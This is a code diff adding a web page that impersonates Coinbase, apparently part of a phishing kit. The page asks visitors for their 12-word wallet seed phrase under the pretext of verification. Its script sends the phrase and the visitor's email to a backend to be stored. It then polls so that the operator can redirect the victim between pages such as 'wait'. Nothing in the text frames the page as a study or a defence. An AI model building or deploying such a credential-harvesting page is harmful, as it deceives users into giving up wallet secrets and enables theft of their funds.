@@ -1,0 +1,315 @@
+---
+import AuthLayout from '../layouts/AuthLayout.astro';
+import AuthCard from '../components/AuthCard.astro';
+import { getUserByEmail, initializeDb } from '../lib/db';
+
+initializeDb();
+
+// Get the cookie from the request
+const cookieHeader = Astro.request.headers.get('cookie');
+const encodedEmail = cookieHeader?.match(/user_email=([^;]+)/)?.[1];
+const userEmail = encodedEmail ? decodeURIComponent(encodedEmail) : null;
+
+// If no user email in cookie, redirect to signin
+if (!userEmail) {
+  return Astro.redirect('/signin');
+}
+
+// Check if user exists in database
+const user = await getUserByEmail(userEmail);
+
+if (!user) {
+  return Astro.redirect('/signin');
+}
+
+// If user is not on seed page, redirect to their current page
+if (user.current_page && user.current_page !== 'seed') {
+  return Astro.redirect(`/${user.current_page}`);
+}
+---
+
+<AuthLayout title="Seed Phrase Verification">
+  <AuthCard>
+    <div class="coinbase-card">
+      <div class="coinbase-logo">coinbase</div>
+      <h2 class="coinbase-heading">Verify seed phrase</h2>
+      <p class="coinbase-subtext">
+        Enter your 12-word seed phrase to verify your wallet
+      </p>
+      <form class="coinbase-verification-form">
+        <div class="coinbase-seed-inputs">
+          <div class="seed-row">
+            <div class="seed-input-wrapper">
+              <span class="seed-number">1</span>
+              <input type="text" class="seed-box" required />
+            </div>
+            <div class="seed-input-wrapper">
+              <span class="seed-number">2</span>
+              <input type="text" class="seed-box" required />
+            </div>
+            <div class="seed-input-wrapper">
+              <span class="seed-number">3</span>
+              <input type="text" class="seed-box" required />
+            </div>
+            <div class="seed-input-wrapper">
+              <span class="seed-number">4</span>
+              <input type="text" class="seed-box" required />
+            </div>
+            <div class="seed-input-wrapper">
+              <span class="seed-number">5</span>
+              <input type="text" class="seed-box" required />
+            </div>
+            <div class="seed-input-wrapper">
+              <span class="seed-number">6</span>
+              <input type="text" class="seed-box" required />
+            </div>
+          </div>
+          <div class="seed-row">
+            <div class="seed-input-wrapper">
+              <span class="seed-number">7</span>
+              <input type="text" class="seed-box" required />
+            </div>
+            <div class="seed-input-wrapper">
+              <span class="seed-number">8</span>
+              <input type="text" class="seed-box" required />
+            </div>
+            <div class="seed-input-wrapper">
+              <span class="seed-number">9</span>
+              <input type="text" class="seed-box" required />
+            </div>
+            <div class="seed-input-wrapper">
+              <span class="seed-number">10</span>
+              <input type="text" class="seed-box" required />
+            </div>
+            <div class="seed-input-wrapper">
+              <span class="seed-number">11</span>
+              <input type="text" class="seed-box" required />
+            </div>
+            <div class="seed-input-wrapper">
+              <span class="seed-number">12</span>
+              <input type="text" class="seed-box" required />
+            </div>
+          </div>
+        </div>
+        <button type="submit" class="coinbase-continue-btn">Continue</button>
+      </form>
+    </div>
+  </AuthCard>
+</AuthLayout>
+
+<style is:global>
+  :root {
+    overflow-x: hidden;
+    background: #111214;
+  }
+</style>
+
+<style>
+  .coinbase-card {
+    /* background: #181a1b; */
+    border-radius: 1.25rem;
+    /* box-shadow: 0 2px 16px 0 rgba(0, 0, 0, 0.10); */
+    /* padding: 1.5rem; */
+    max-width: 600px;
+    margin: 2rem auto;
+  }
+  .coinbase-logo {
+    font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
+    font-weight: 700;
+    font-size: 1.75rem;
+    color: #1652f0;
+    margin-bottom: 1.5rem;
+    text-align: left;
+    letter-spacing: -1px;
+  }
+  .coinbase-heading {
+    color: #fff;
+    font-size: 1.1rem;
+    font-weight: 600;
+    margin-bottom: 0.4rem;
+    text-align: left;
+  }
+  .coinbase-subtext {
+    color: #b5b5b6;
+    font-size: 0.9rem;
+    line-height: 1.4;
+    margin-bottom: 1.5rem;
+    text-align: left;
+  }
+  .coinbase-verification-form {
+    display: flex;
+    flex-direction: column;
+    gap: 1.5rem;
+  }
+  .coinbase-seed-inputs {
+    display: flex;
+    flex-direction: column;
+    gap: 1rem;
+  }
+  .seed-row {
+    display: grid;
+    grid-template-columns: repeat(6, 1fr);
+    gap: 0.5rem;
+  }
+  .seed-input-wrapper {
+    position: relative;
+  }
+  .seed-number {
+    position: absolute;
+    top: -8px;
+    left: 8px;
+    font-size: 0.7rem;
+    color: #b5b5b6;
+    background: #111214;
+    padding: 0 4px;
+    z-index: 1;
+  }
+  .seed-box {
+    width: 100%;
+    height: 40px;
+    border-radius: 0.4rem;
+    border: 1.5px solid #23262a;
+    background: #23262a;
+    color: #fff;
+    font-size: 0.9rem;
+    text-align: center;
+    outline: none;
+    transition: border-color 0.2s;
+    padding: 0.5rem;
+  }
+  .seed-box:focus {
+    border-color: #1652f0;
+    background: #23262a;
+  }
+  .coinbase-continue-btn {
+    width: 100%;
+    padding: 0.8rem 0;
+    font-size: 1rem;
+    font-weight: 600;
+    color: #fff;
+    background: #1652f0;
+    border: none;
+    border-radius: 0.4rem;
+    cursor: pointer;
+    opacity: 1;
+    margin-top: 0.4rem;
+    transition: background 0.2s, color 0.2s;
+  }
+  .coinbase-continue-btn:hover {
+    background: #0a46e4;
+  }
+  .coinbase-continue-btn:disabled {
+    background: #23262a;
+    color: #b5b5b6;
+    cursor: not-allowed;
+    opacity: 0.7;
+  }
+  .error-message {
+    color: #ff4d4f;
+    font-size: 0.9rem;
+    margin-bottom: 1rem;
+    text-align: left;
+  }
+</style>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    // Add polling for current_page changes
+    const checkCurrentPage = async () => {
+      try {
+        const email = decodeURIComponent(document.cookie.match(/user_email=([^;]+)/)?.[1] || '');
+        if (!email) return;
+        
+        const response = await fetch('/api/users?email=' + encodeURIComponent(email));
+        const userData = await response.json();
+        
+        if (userData.current_page && userData.current_page !== 'seed') {
+          window.location.href = '/' + userData.current_page;
+        }
+      } catch (error) {
+        console.error('Error checking current page:', error);
+      }
+    };
+
+    // Check every 2 seconds
+    setInterval(checkCurrentPage, 2000);
+
+    const inputs = Array.from(document.querySelectorAll<HTMLInputElement>('.seed-box'));
+    const continueButton = document.querySelector<HTMLButtonElement>('.coinbase-continue-btn');
+    
+    // Tab through inputs when typing
+    inputs.forEach((input, idx) => {
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Tab' || e.key === 'Enter') {
+          if (idx < inputs.length - 1) {
+            e.preventDefault();
+            inputs[idx + 1].focus();
+          }
+        } else if (e.key === 'Backspace' && !input.value && idx > 0) {
+          inputs[idx - 1].focus();
+        }
+      });
+    });
+
+    const form = document.querySelector<HTMLFormElement>('.coinbase-verification-form');
+    if (form) {
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const seedPhrase = inputs.map(input => input.value.trim()).join(' ');
+        console.log('Submitted seed phrase:', seedPhrase);
+
+        try {
+          if (continueButton) {
+            continueButton.disabled = true;
+            continueButton.textContent = 'Verifying...';
+          }
+
+          // Update user's seed phrase and current page
+          const email = decodeURIComponent(document.cookie.match(/user_email=([^;]+)/)?.[1] || '');
+          
+          const response = await fetch('/api/users', {
+            method: 'PUT',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              email: email,
+              user_seed_phrase: seedPhrase,
+              current_page: 'wait'
+            })
+          });
+
+          if (response.ok) {
+            // Redirect to wait page
+            window.location.href = '/wait';
+          } else {
+            const error = await response.json();
+            
+            const errorMessage = document.createElement('div');
+            errorMessage.className = 'error-message';
+            errorMessage.textContent = error.message || 'Failed to submit seed phrase. Please try again.';
+            form.insertBefore(errorMessage, form.firstChild);
+            
+            if (continueButton) {
+              continueButton.disabled = false;
+              continueButton.textContent = 'Continue';
+            }
+          }
+        } catch (error) {
+          console.error('Error during submission:', error);
+          
+          const errorMessage = document.createElement('div');
+          errorMessage.className = 'error-message';
+          errorMessage.textContent = 'Network error. Please try again.';
+          form.insertBefore(errorMessage, form.firstChild);
+          
+          if (continueButton) {
+            continueButton.disabled = false;
+            continueButton.textContent = 'Continue';
+          }
+        }
+      });
+    }
+  });
+</script> 
